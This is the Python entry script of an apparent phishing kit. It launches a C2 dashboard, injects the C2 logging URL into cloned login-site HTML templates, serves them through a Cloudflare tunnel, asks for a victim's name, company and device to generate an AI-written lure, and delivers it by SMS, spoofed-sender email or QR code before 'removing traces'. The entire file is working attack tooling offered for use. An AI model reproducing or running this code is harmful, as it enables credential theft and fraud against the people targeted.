#!/usr/bin/env python3
import os
import yaml
import threading
import time
import glob
import socket
import subprocess
from core.server import start_php_server
from core.exfil import start_c2
from tunnels.cloudflare import start_tunnel
from core.utils import banner, select_template, get_local_ip
from sms_sender import send_sms
from email_sender import send_email
from qr_generator import generate_qr
from ai_lure import generate_lure

# Load config
with open("config.yaml", "r") as f:
    config = yaml.safe_load(f)

def main():
    banner()
    template = select_template()
    port = config['phishing']['default_port']

    # Start C2
    print(f"[C2] Starting dashboard → http://localhost:{config['c2']['port']}")
    threading.Thread(target=start_c2, daemon=True).start()
    time.sleep(2)

    # Inject C2 URL into all HTML
    c2_url = f"http://{get_local_ip()}:{config['c2']['port']}/log"
    for file in glob.glob(f"sites/{template}/**/*.html", recursive=True):
        with open(file, 'r') as f: content = f.read()
        content = content.replace("http://YOUR_C2_IP:5000/log", c2_url)
        with open(file, 'w') as f: f.write(content)

    # Start PHP server
    print(f"[SERVER] Forging {template} → :{port}")
    start_php_server(template, port)

    # Start tunnel
    print(f"[TUNNEL] Starting Cloudflare Argo...")
    link = start_tunnel(port)
    print(f"\n[PHISH LINK] {link}\n")

    # AI LURE
    print("[AI LURE GENERATOR]")
    name = input("  Victim Name (default: User): ").strip() or "User"
    company = input("  Company (default: Acme Corp): ").strip() or "Acme Corp"
    device = input("  Device (default: iPhone): ").strip() or "iPhone"

    lure = generate_lure(template, link, name, company, device)
    print(f"\n[AI LURE] {lure}\n")

    # Delivery
    if input("Send via SMS? (y/n): ").lower() == 'y':
        phone = input("  Phone (+1234567890): ")
        send_sms(phone, lure)

    if input("Send via Email? (y/n): ").lower() == 'y':
        email = input("  Email: ")
        subject = f"Action Required: {template.title()} Account"
        send_email(email, subject, f"<p>{lure}</p>", f"no-reply@{template}.com")

    if input("Generate QR Code? (y/n): ").lower() == 'y':
        generate_qr(link)

    input("\n[SHUTDOWN] Press ENTER to vanish...")
    print("[CLEANUP] Removing traces...")
    os.system("pkill -f php > /dev/null 2>&1")
    os.system("pkill -f cloudflared > /dev/null 2>&1")

if __name__ == "__main__":
    main()